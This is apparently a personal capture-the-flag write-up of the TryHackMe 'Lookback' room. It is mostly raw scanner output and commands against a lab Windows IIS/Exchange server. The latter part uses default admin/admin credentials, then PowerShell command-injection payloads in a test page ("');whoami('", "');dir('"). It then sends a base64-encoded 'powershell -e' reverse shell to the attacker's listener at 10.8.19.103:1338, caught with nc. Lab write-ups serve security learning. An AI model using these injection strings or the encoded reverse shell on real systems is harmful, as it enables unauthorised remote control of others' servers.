----
You’ve been asked to run a vulnerability test on a production environment.
---

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6cb23ff9b40ce86c6b61c485e66621bb.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/d8877bf37d4015f1b78d243078dece09.png)
###  Find the flags

 Start Machine

The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?  

  

Start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. This machine does not respond to ping (ICMP).  
  

Can you find all the flags?

The VM takes about 5/10 minutes to fully boot up.

  

_Sometimes to move forward, we have to go backward._

_So if you get stuck, try to look back!_

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.61.189 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.61.189:80
Open 10.10.61.189:443
Open 10.10.61.189:3389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-07 12:02 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:02
Completed Parallel DNS resolution of 1 host. at 12:02, 0.03s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:02
Scanning 10.10.61.189 [3 ports]
Discovered open port 80/tcp on 10.10.61.189
Discovered open port 443/tcp on 10.10.61.189
Discovered open port 3389/tcp on 10.10.61.189
Completed Connect Scan at 12:02, 0.39s elapsed (3 total ports)
Initiating Service scan at 12:02
Scanning 3 services on 10.10.61.189
Completed Service scan at 12:03, 45.73s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.61.189.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 9.41s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 2.26s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Nmap scan report for 10.10.61.189
Host is up, received user-set (0.38s latency).
Scanned at 2023-04-07 12:02:33 EDT for 58s

PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  ssl/https     syn-ack
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Outlook
|_Requested resource was https://10.10.61.189/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.61.189%2fowa%2f&reason=0
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Issuer: commonName=WIN-12OUO7A66M7
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-01-25T21:34:02
| Not valid after:  2028-01-25T21:34:02
| MD5:   84e0805f3667c38fd8204e7c1da04215
| SHA-1: 08458fd9d9bfc4c648db1f82d3e7324ea92452d7
| -----BEGIN CERTIFICATE-----
| MIIDKjCCAhKgAwIBAgIQTm2IqMBJs7RKv49wp456pzANBgkqhkiG9w0BAQUFADAa
| MRgwFgYDVQQDEw9XSU4tMTJPVU83QTY2TTcwHhcNMjMwMTI1MjEzNDAyWhcNMjgw
| MTI1MjEzNDAyWjAaMRgwFgYDVQQDEw9XSU4tMTJPVU83QTY2TTcwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDS7xdfJC7zHZQtxk7LNxq1DQaaapFZsRId
| 66AbvRCYdvTISToxEDYEprkrIU0YIbB9DzvOYQ23X3F3Y7ylUXRsd0yq3lVX86gD
| KtWAChKB9ph0VERYqOXoM5Aaej15todacRmqVgX8lbkK37qVPLz9g7n8VfgrJii9
| zl1Mm8i17s1KERY9aIyxrYecU1dBCX+R4foMHETB7i0yTtG0H+6MAykoTJSJcX+C
| Mx5QTASgGQXpgRSzUy5SSkJlLasyZ+WVnji6ShZWC3/dHUED0cO+AFna2NFQIASa
| fWGXXGnhaCLXctm9dDUnq2eg/+AfkJQNbn5eKIGsBYXDG7tfAqFNAgMBAAGjbDBq
| MA4GA1UdDwEB/wQEAwIFoDA1BgNVHREELjAsgg9XSU4tMTJPVU83QTY2TTeCGVdJ
| Ti0xMk9VTzdBNjZNNy50aG0ubG9jYWwwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYD
| VR0TAQH/BAIwADANBgkqhkiG9w0BAQUFAAOCAQEAPV5SA6om07FjNj3mlpTBJMxI
| 8aOECGirP6f7w5pFqYZ/8TP3ZL2o9Iy2ZzgipcvO0t71IAxHswFv2NN551wNkfie
| ZlcZSzsep/ym+EVRADLeyuDTt5T3aRq4n6EO4DQN0iyczisChAieFFi7FNXJerft
| uAQlqIrqvmpvMlMoin/TLv1Wg4QRXvUk5J4gI8q0DNQt7/bk8DUaHrumq7AP5jym
| wUf2+fSq4nPyB/kW39ftUKiJU/bzmEf4gMozeXTQhzkpFRTgSO+9sRTmiTsk6UMz
| l3WZLZr4/d/H5dnN0b/3k7CcuoFlmZjSKhnIcPQfXBEUIf5dE7pS7BaqVMooYQ==
|_-----END CERTIFICATE-----
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Issuer: commonName=WIN-12OUO7A66M7.thm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-25T21:12:51
| Not valid after:  2023-07-27T21:12:51
| MD5:   dce9a0190d34ca2401bdb21574409c9d
| SHA-1: d55a03f1992df334805947f990eb25be4092cbf0
| -----BEGIN CERTIFICATE-----
| MIIC9jCCAd6gAwIBAgIQVVEvN1hoxopPxcxgdQbcKzANBgkqhkiG9w0BAQsFADAk
| MSIwIAYDVQQDExlXSU4tMTJPVU83QTY2TTcudGhtLmxvY2FsMB4XDTIzMDEyNTIx
| MTI1MVoXDTIzMDcyNzIxMTI1MVowJDEiMCAGA1UEAxMZV0lOLTEyT1VPN0E2Nk03
| LnRobS5sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCg6Tls
| nrbpOjmP7oy5Ncw+r/Q+Pab6Q4GaHQBCE+gD5XGim9S71LVrxf942NzVSL1ebc3k
| cC+AweAlzaS8AphN+ZbULdLN0hEamafEV0y3ZsYrQBPdqHXg9c4wk7TubmbzU6zY
| fABPXkXQE4nNlJPnlOsaiTCXhuPFLxKLABZ1DLWmFFBLZMC1j88Rb4Pc/BBENYY3
| 8nJIGJi9F44Eq/BDTUiIXCpc6tRkaWclPPB3qVHGOufSkisaWIPYhTIcrHYSHpYO
| MrWqYeJGMuvOdfzXThupfyB9E2ESRM/VZvRzU9cy63Fa5W0fcI4FPmb3SRfQLcHz
| NV5qqMePSSO8FT0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0P
| BAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQAYMi75E8iMGYhCufi02kwo7Q4Q4iSj
| x/Qkme3u+mji8LCeKP7ustS0piVYRZmQlu7IYgeQSHJLqdOquh1cUOpFq+Dc0XX6
| g+wnhCT1qrl+VQz4MfXBh0KwLLWPvLWHJIno+ZKSVgnD/Thsn3UR3AHjG/mr43PS
| PEV1TXqyDyeG3Z0l/z7qfqHXxttdoxVB5VHl2tg0dCf8llmrmhYjEpAi/KC3Hlra
| kxjulcfLKTaUSRytiv//q+WSQIhNvMCGI2UxWiXcLAcv+aIHsUdIGCPrzhnIVCOA
| YCAqzbCtd181CJrW9mlBaiUX6H5yONtSxdZLFFmOsY/rnqOJarElTpQT
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-04-07T16:03:21+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.20 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts 
10.10.61.189 WIN-12OUO7A66M7.thm.local

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u 10.10.61.189 -i200,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.61.189_23-04-07_12-15-52.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-07_12-15-52.log

Target: http://10.10.61.189/

[12:15:53] Starting: 
[12:16:48] 401 -    0B  - /rpc

Task Completed


┌──(witty㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://win-12ouo7a66m7.thm.local/FUZZ" -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://win-12ouo7a66m7.thm.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

[Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 196ms]
    * FUZZ: test

need a user and a pass

 <h2>403 - Forbidden: Access is denied.</h2>

  <h3>You do not have permission to view this directory or page using the credentials that you supplied.

┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -host 10.10.61.189                               
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.61.189
+ Target Hostname:    10.10.61.189
+ Target Port:        80
+ Start Time:         2023-04-07 12:21:33 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ All CGI directories 'found', use '-C none' to test none
+ /Autodiscover/Autodiscover.xml: Retrieved x-powered-by header: ASP.NET.
+ /Autodiscover/Autodiscover.xml: Uncommon header 'x-feserver' found, with contents: WIN-12OUO7A66M7.
+ /Rpc: Uncommon header 'request-id' found, with contents: 1c211d8b-c4ea-4c34-8646-1a277c9a6677.
+ /Rpc: Default account found for '' at (ID 'admin', PW 'admin'). Generic account discovered.. See: CWE-16


default creds

https://10.10.61.189/test/

This interface should be removed on production!

THM{Security_Through_Obscurity_Is_Not_A_Defense}

Get-Content : Cannot find path 'C:\test' because it does not exist.
At line:1 char:1
+ Get-Content('C:\test')
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\test:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand

')&whoami

At line:1 char:19
+ Get-Content('C:\')&whoami')
+                   ~
The ampersand (&) character is not allowed. The & operator is reserved for future use; wrap an ampersand in double 
quotation marks ("&") to pass it as part of a string.
At line:1 char:26
+ Get-Content('C:\')&whoami')

')&whoami('

+ Get-Content('C:\')&whoami('')
+                   ~
The ampersand (&) character is not allowed. The & operator is reserved for future use; wrap an ampersand in double 
quotation marks ("&") to pass it as part of a string.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : AmpersandNotAllowed

');whoami('

Get-Content : Access to the path 'C:\' is denied.
At line:1 char:1
+ Get-Content('C:\');whoami('')
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
 
thm\admin

')|whoami('

thm\admin

or just ')| whatever; & whoami('

');dir('

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023   1:35 PM                backup                                                                
d-----        1/25/2023  12:12 PM                Config                                                                
d-----        1/25/2023  12:12 PM                en                                                                    
d-----        1/25/2023   1:04 PM                en-US                                                                 
d-----         4/7/2023   8:57 AM                History                                                               
d-----        1/25/2023  12:44 PM                MetaBack                                                              
-a----        1/25/2023  12:44 PM         252928 abocomp.dll                                                           
-a----        1/25/2023  12:44 PM         324608 adsiis.dll                                                            
-a----        1/25/2023  12:12 PM         119808 appcmd.exe                                                            
-a----        9/15/2018  12:14 AM           3810 appcmd.xml                                                            
-a----        1/25/2023  12:12 PM         181760 AppHostNavigators.dll                                                 
-a----        1/25/2023  12:11 PM          80896 apphostsvc.dll                                                        
-a----        1/25/2023  12:12 PM         406016 appobj.dll                                                            
-a----        1/25/2023  12:15 PM         504320 asp.dll                                                               
-a----        1/25/2023  12:15 PM          22196 asp.mof                                                               
-a----        1/25/2023  12:11 PM         131072 aspnetca.exe                                                          
-a----        1/25/2023  12:15 PM          23040 asptlb.tlb                                                            
-a----        1/25/2023  12:12 PM          40448 authanon.dll                                                          
-a----        1/25/2023  12:15 PM          38400 authbas.dll                                                           
-a----        1/25/2023  12:15 PM          27136 authcert.dll                                                          
-a----        1/25/2023  12:15 PM          44544 authmap.dll                                                           
-a----        1/25/2023  12:15 PM          40960 authmd5.dll                                                           
-a----        1/25/2023  12:15 PM          52736 authsspi.dll                                                          
-a----        1/25/2023  12:15 PM          74240 browscap.dll                                                          
-a----        1/25/2023  12:15 PM          34474 browscap.ini                                                          
-a----        1/25/2023  12:11 PM          24064 cachfile.dll                                                          
-a----        1/25/2023  12:11 PM          52224 cachhttp.dll                                                          
-a----        1/25/2023  12:11 PM          15872 cachtokn.dll                                                          
-a----        1/25/2023  12:11 PM          14336 cachuri.dll                                                           
-a----        1/25/2023  12:15 PM          43520 cgi.dll                                                               
-a----        1/25/2023  12:54 PM          99328 Cnfgprts.ocx                                                          
-a----        1/25/2023  12:44 PM          86528 coadmin.dll                                                           
-a----        1/25/2023  12:15 PM          43008 compdyn.dll                                                           
-a----        1/25/2023  12:11 PM          54784 compstat.dll                                                          
-a----        1/25/2023  12:12 PM          47104 custerr.dll                                                           
-a----        1/25/2023  12:11 PM          20480 defdoc.dll                                                            
-a----        1/25/2023  12:15 PM          38912 diprestr.dll                                                          
-a----        1/25/2023  12:11 PM          24064 dirlist.dll                                                           
-a----        1/25/2023  12:15 PM          68096 filter.dll                                                            
-a----        1/25/2023  12:12 PM          38400 gzip.dll                                                              
-a----        1/25/2023  12:11 PM          22016 httpmib.dll                                                           
-a----        1/25/2023  12:11 PM          18432 hwebcore.dll                                                          
-a----        1/25/2023  12:12 PM          63105 iis.msc                                                               
-a----        1/25/2023  12:54 PM          48997 iis6.msc                                                              
-a----        1/25/2023  12:44 PM          26112 iisadmin.dll                                                          
-a----        1/25/2023  12:44 PM        1016832 iiscfg.dll                                                            
-a----        1/25/2023  12:11 PM         307200 iiscore.dll                                                           
-a----        1/25/2023  12:15 PM         132608 iisetw.dll                                                            
-a----        1/25/2023  12:44 PM         104448 iisext.dll                                                            
-a----        1/25/2023  12:15 PM          86016 iisfcgi.dll                                                           
-a----        1/25/2023  12:15 PM         168448 iisfreb.dll                                                           
-a----        1/25/2023  12:15 PM          88576 iislog.dll                                                            
-a----        1/25/2023  12:11 PM         110080 iisreg.dll                                                            
-a----        1/25/2023  12:15 PM          18432 iisreqs.dll                                                           
-a----        1/25/2023  12:12 PM         231936 iisres.dll                                                            
-a----        1/25/2023  12:11 PM          37888 iisrstas.exe                                                          
-a----        1/25/2023  12:12 PM         192512 iissetup.exe                                                          
-a----        1/25/2023  12:12 PM          57344 iissyspr.dll                                                          
-a----        1/25/2023  12:11 PM          14848 iisual.exe                                                            
-a----        1/25/2023  12:54 PM         262656 iisui.dll                                                             
-a----        1/25/2023  12:54 PM          81408 IISUiObj.dll                                                          
-a----        1/25/2023  12:12 PM         284672 iisutil.dll                                                           
-a----        1/25/2023  12:12 PM         612864 iisw3adm.dll                                                          
-a----        1/25/2023  12:54 PM         260608 iiswmi.dll                                                            
-a----        1/25/2023  12:15 PM          33792 iis_ssi.dll                                                           
-a----        1/25/2023  12:44 PM          16896 inetinfo.exe                                                          
-a----        1/25/2023  12:54 PM         932352 inetmgr.dll                                                           
-a----        1/25/2023  12:12 PM         125440 InetMgr.exe                                                           
-a----        1/25/2023  12:54 PM          25088 InetMgr6.exe                                                          
-a----        1/25/2023  12:44 PM         256000 infocomm.dll                                                          
-a----        1/25/2023  12:15 PM          30208 iprestr.dll                                                           
-a----        1/25/2023  12:15 PM         131584 isapi.dll                                                             
-a----        1/25/2023  12:44 PM          67072 isatq.dll                                                             
-a----        1/25/2023  12:44 PM          25600 iscomlog.dll                                                          
-a----        1/25/2023  12:15 PM          24064 logcust.dll                                                           
-a----        1/25/2023  12:12 PM          36352 loghttp.dll                                                           
-a----        1/25/2023  12:54 PM          39424 logscrpt.dll                                                          
-a----        1/25/2023  12:15 PM            330 logtemp.sql                                                           
-a----        1/25/2023  12:54 PM          88064 logui.ocx                                                             
-a----        1/25/2023  12:44 PM         685464 MBSchema.bin.00000000h                                                
-a----        1/25/2023  12:44 PM         266906 MBSchema.xml                                                          
-a----         4/7/2023   8:57 AM          10152 MetaBase.xml                                                          
-a----        1/25/2023  12:44 PM         334848 metadata.dll                                                          
-a----        1/25/2023  12:11 PM         147456 Microsoft.Web.Administration.dll                                      
-a----        1/25/2023  12:12 PM        1052672 Microsoft.Web.Management.dll                                          
-a----        1/25/2023  12:11 PM          44032 modrqflt.dll                                                          
-a----        1/25/2023  12:12 PM         478720 nativerd.dll                                                          
-a----        1/25/2023  12:12 PM          27136 protsup.dll                                                           
-a----        1/25/2023  12:15 PM          21504 redirect.dll                                                          
-a----        1/25/2023  12:44 PM          10752 rpcref.dll                                                            
-a----        1/25/2023  12:12 PM          33792 rsca.dll                                                              
-a----        1/25/2023  12:12 PM          51200 rscaext.dll                                                           
-a----        1/25/2023  12:11 PM          40448 static.dll                                                            
-a----        1/25/2023  12:54 PM          18944 svcext.dll                                                            
-a----        1/25/2023  12:11 PM         189952 uihelper.dll                                                          
-a----        1/25/2023  12:15 PM          23552 urlauthz.dll                                                          
-a----        1/25/2023  12:54 PM          21504 validcfg.dll                                                          
-a----        1/25/2023  12:15 PM         146250 w3core.mof                                                            
-a----        1/25/2023  12:12 PM          16384 w3ctrlps.dll                                                          
-a----        1/25/2023  12:11 PM          29696 w3ctrs.dll                                                            
-a----        1/25/2023  12:11 PM         109568 w3dt.dll                                                              
-a----        1/25/2023  12:15 PM           2560 w3isapi.mof                                                           
-a----        1/25/2023  12:12 PM         101888 w3logsvc.dll                                                          
-a----        1/25/2023  12:12 PM          29184 w3tp.dll                                                              
-a----        1/25/2023  12:11 PM          26624 w3wp.exe                                                              
-a----        1/25/2023  12:12 PM          78336 w3wphost.dll                                                          
-a----        1/25/2023  12:44 PM          39936 wamreg.dll                                                            
-a----        1/25/2023  12:12 PM          31744 wbhstipm.dll                                                          
-a----        1/25/2023  12:12 PM          27648 wbhst_pm.dll                                                          
-a----        1/25/2023  12:15 PM         189952 webdav.dll                                                            
-a----        1/25/2023  12:15 PM          23552 webdav_simple_lock.dll                                                
-a----        1/25/2023  12:15 PM          20480 webdav_simple_prop.dll                                                
-a----        1/25/2023  12:54 PM          12288 WMSvc.exe                                                             
-a----        9/15/2018  12:13 AM            165 wmsvc.exe.config                                                      
-a----        1/25/2023  12:12 PM         169984 XPath.dll

revshell

powershell#3 base64

');powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEAOQAuADEAMAAzACIALAAxADMAMwA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==('

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338                                     
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.61.189] 9779
whoami
thm\admin
PS C:\windows\system32\inetsrv> dir


    Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023   1:35 PM                backup                                                                
d-----        1/25/2023  12:12 PM                Config                                                                
d-----        1/25/2023  12:12 PM                en                                                                    
d-----        1/25/2023   1:04 PM                en-US                                                                 
d-----         4/7/2023   8:57 AM                History                                                               
d-----        1/25/2023  12:44 PM                MetaBack                                                              
-a----        1/25/2023  12:44 PM         252928 abocomp.dll                                                           
-a----        1/25/2023  12:44 PM         324608 adsiis.dll                                                            
-a----        1/25/2023  12:12 PM         119808 appcmd.exe                                                            
-a----        9/15/2018  12:14 AM           3810 appcmd.xml                                                            
-a----        1/25/2023  12:12 PM         181760 AppHostNavigators.dll                                                 
-a----        1/25/2023  12:11 PM          80896 apphostsvc.dll                                                        
-a----        1/25/2023  12:12 PM         406016 appobj.dll                                                            
-a----        1/25/2023  12:15 PM         504320 asp.dll                                                               
-a----        1/25/2023  12:15 PM          22196 asp.mof                                                               
-a----        1/25/2023  12:11 PM         131072 aspnetca.exe                                                          
-a----        1/25/2023  12:15 PM          23040 asptlb.tlb                                                            
-a----        1/25/2023  12:12 PM          40448 authanon.dll                                                          
-a----        1/25/2023  12:15 PM          38400 authbas.dll                                                           
-a----        1/25/2023  12:15 PM          27136 authcert.dll                                                          
-a----        1/25/2023  12:15 PM          44544 authmap.dll                                                           
-a----        1/25/2023  12:15 PM          40960 authmd5.dll                                                           
-a----        1/25/2023  12:15 PM          52736 authsspi.dll                                                          
-a----        1/25/2023  12:15 PM          74240 browscap.dll                                                          
-a----        1/25/2023  12:15 PM          34474 browscap.ini                                                          
-a----        1/25/2023  12:11 PM          24064 cachfile.dll                                                          
-a----        1/25/2023  12:11 PM          52224 cachhttp.dll                                                          
-a----        1/25/2023  12:11 PM          15872 cachtokn.dll                                                          
-a----        1/25/2023  12:11 PM          14336 cachuri.dll                                                           
-a----        1/25/2023  12:15 PM          43520 cgi.dll                                                               
-a----        1/25/2023  12:54 PM          99328 Cnfgprts.ocx                                                          
-a----        1/25/2023  12:44 PM          86528 coadmin.dll                                                           
-a----        1/25/2023  12:15 PM          43008 compdyn.dll                                                           
-a----        1/25/2023  12:11 PM          54784 compstat.dll                                                          
-a----        1/25/2023  12:12 PM          47104 custerr.dll                                                           
-a----        1/25/2023  12:11 PM          20480 defdoc.dll                                                            
-a----        1/25/2023  12:15 PM          38912 diprestr.dll                                                          
-a----        1/25/2023  12:11 PM          24064 dirlist.dll                                                           
-a----        1/25/2023  12:15 PM          68096 filter.dll                                                            
-a----        1/25/2023  12:12 PM          38400 gzip.dll                                                              
-a----        1/25/2023  12:11 PM          22016 httpmib.dll                                                           
-a----        1/25/2023  12:11 PM          18432 hwebcore.dll                                                          
-a----        1/25/2023  12:12 PM          63105 iis.msc                                                               
-a----        1/25/2023  12:54 PM          48997 iis6.msc                                                              
-a----        1/25/2023  12:44 PM          26112 iisadmin.dll                                                          
-a----        1/25/2023  12:44 PM        1016832 iiscfg.dll                                                            
-a----        1/25/2023  12:11 PM         307200 iiscore.dll                                                           
-a----        1/25/2023  12:15 PM         132608 iisetw.dll                                                            
-a----        1/25/2023  12:44 PM         104448 iisext.dll                                                            
-a----        1/25/2023  12:15 PM          86016 iisfcgi.dll                                                           
-a----        1/25/2023  12:15 PM         168448 iisfreb.dll                                                           
-a----        1/25/2023  12:15 PM          88576 iislog.dll                                                            
-a----        1/25/2023  12:11 PM         110080 iisreg.dll                                                            
-a----        1/25/2023  12:15 PM          18432 iisreqs.dll                                                           
-a----        1/25/2023  12:12 PM         231936 iisres.dll                                                            
-a----        1/25/2023  12:11 PM          37888 iisrstas.exe                                                          
-a----        1/25/2023  12:12 PM         192512 iissetup.exe                                                          
-a----        1/25/2023  12:12 PM          57344 iissyspr.dll                                                          
-a----        1/25/2023  12:11 PM          14848 iisual.exe                                                            
-a----        1/25/2023  12:54 PM         262656 iisui.dll                                                             
-a----        1/25/2023  12:54 PM          81408 IISUiObj.dll                                                          
-a----        1/25/2023  12:12 PM         284672 iisutil.dll                                                           
-a----        1/25/2023  12:12 PM         612864 iisw3adm.dll                                                          
-a----        1/25/2023  12:54 PM         260608 iiswmi.dll                                                            
-a----        1/25/2023  12:15 PM          33792 iis_ssi.dll                                                           
-a----        1/25/2023  12:44 PM          16896 inetinfo.exe                                                          
-a----        1/25/2023  12:54 PM         932352 inetmgr.dll                                                           
-a----        1/25/2023  12:12 PM         125440 InetMgr.exe                                                           
-a----        1/25/2023  12:54 PM          25088 InetMgr6.exe                                                          
-a----        1/25/2023  12:44 PM         256000 infocomm.dll                                                          
-a----        1/25/2023  12:15 PM          30208 iprestr.dll                                                           
-a----        1/25/2023  12:15 PM         131584 isapi.dll                                                             
